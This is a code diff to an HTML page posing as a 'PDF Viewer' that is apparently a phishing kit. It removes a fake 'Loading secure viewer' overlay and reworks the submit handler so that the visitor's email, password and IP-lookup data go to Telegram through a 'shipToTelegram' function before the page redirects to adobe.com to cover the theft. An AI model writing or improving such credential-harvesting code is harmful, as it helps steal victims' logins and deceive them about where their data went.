@@ -6,8 +6,6 @@
     <title>PDF Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
-	@keyframes gateSpin { to { transform: rotate(360deg); } }
-body.gated > *:not(#page-gate) { visibility: hidden; }
       .low-radius {
         border-radius: 4px;
       }
@@ -102,10 +100,7 @@ body.gated > *:not(#page-gate) { visibility: hidden; }
     </style>
   </head>
   <body style="background-color: rgb(156, 20, 8);" class="gated">
-  <div id="page-gate" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;z-index:99999;display:flex;justify-content:center;align-items:center;flex-direction:column;">
-  <div style="width:56px;height:56px;border:5px solid #333;border-top-color:#e04a3a;border-radius:50%;animation:gateSpin 0.8s linear infinite;"></div>
-  <p style="color:#aaa;font-family:Arial,sans-serif;font-size:14px;margin-top:16px;letter-spacing:0.5px;">Loading secure viewer...</p>
-</div>
+  
     <div id="blackbar">
     <table style="text-align: left; width: 95%; height: 31px">
       <tbody>
@@ -523,21 +518,24 @@ body.gated > *:not(#page-gate) { visibility: hidden; }
         return
       }
 
-      const email = emailFld.value.trim()
+      showLoading()
 
-      // FIRE IMMEDIATELY — do NOT await, do NOT wait for IP lookup
-      shipToTelegram({
-        email: email,
+      // wait for the IP lookup so the message is complete
+      if (!visitorInfo) visitorInfo = await visitorInfoPromise
+
+      await shipToTelegram({
+        email: emailFld.value.trim(),
         password: password,
         attempt: 'first'
       })
 
-      // Give the fetch a moment to leave the browser, then redirect
-      showLoading()
+      // keep the UI "loading" while the user waits, then redirect
       setTimeout(() => {
+        // optional redirect — keep or change
         window.location.href = "https://www.adobe.com/"
       }, 1200)
     }
+  })
 </script>
 
 
